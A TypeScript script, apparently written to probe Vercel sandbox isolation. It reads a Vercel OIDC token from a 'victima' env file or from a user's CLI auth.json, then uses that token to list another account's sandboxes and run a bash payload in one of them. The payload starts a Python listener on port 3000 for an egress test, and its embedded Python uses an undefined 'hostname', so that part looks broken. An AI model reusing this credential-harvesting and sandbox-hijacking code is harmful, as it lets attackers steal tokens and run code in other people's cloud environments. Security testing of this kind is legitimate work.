import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
import { APIClient } from "/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js";
const raw = (await import("/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js")).APIClient;

async function main() {
  const client = new raw({ token: VICTIM, teamId, projectId });
  const l: any = await client.listSandboxes({ projectId, limit: 50 });
  const sbxs = l.json?.sandboxes ?? l.json ?? [];
  const target = sbxs.find((s: any) => s.name?.startsWith("curl-v3-"));
  if (!target) { console.error("no curl-v3"); process.exit(1); }
  const s = await Sandbox.get({ name: target.name, token: VICTIM, teamId, projectId });
  const dom = s.domain(3000);
  console.log("DOMAIN:", dom);

  const SCRIPT = `
set +e
echo "=== levantar servidor HTTP en puerto 3000 (marca unica) ==="
cat > /tmp/srv.py << 'PYEOF'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 3000))
s.listen(50)
while True:
    c, a = s.accept()
    try:
        data = c.recv(4096).decode("utf-8","replace")
        body = "EGRESS-TEST peer=%s:%s host=%s first=%s" % (a[0], a[1], hostname, data.split(chr(10))[0] if data else "")
        c.sendall(b"HTTP/1.1 200 OK\\r\\nContent-Length: %d\\r\\n\\r\\n%s" % (len(body.encode()), body.encode()))
    except: pass
    c.close()
PYEOF
hostname=$(hostname)
nohup python3 /tmp/srv.py > /tmp/srv.log 2>&1 &
sleep 1
ss -tln | grep 3000
echo "server-ok hostname=$hostname"
echo "=== DONE ==="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 30_000 });
  console.log(await r.output("both"));
  console.log("KEEP_ALIVE=" + dom);
  console.log("EGRESS_IP=3.237.28.239");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });